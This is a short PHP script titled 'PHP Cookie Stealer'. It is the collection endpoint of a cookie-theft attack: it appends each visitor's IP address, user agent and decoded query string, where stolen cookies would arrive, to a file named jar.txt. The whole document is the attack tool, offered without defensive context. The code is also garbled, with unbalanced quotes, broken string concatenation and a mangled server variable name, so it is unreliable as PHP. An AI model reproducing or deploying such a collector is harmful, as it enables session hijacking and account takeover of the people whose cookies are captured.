## PHP Cookie Stealer  


<?

$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER ['HTTP_USER_AGENT'];

$fp = fopen(jar.txt','a');

fwrite($fp, $ip.' .'$browser."\n");
fwrite($fp, urldecode($_SERVER['QUERY['QURY_STRING']). "\n\n");
fclose($fp);
?>
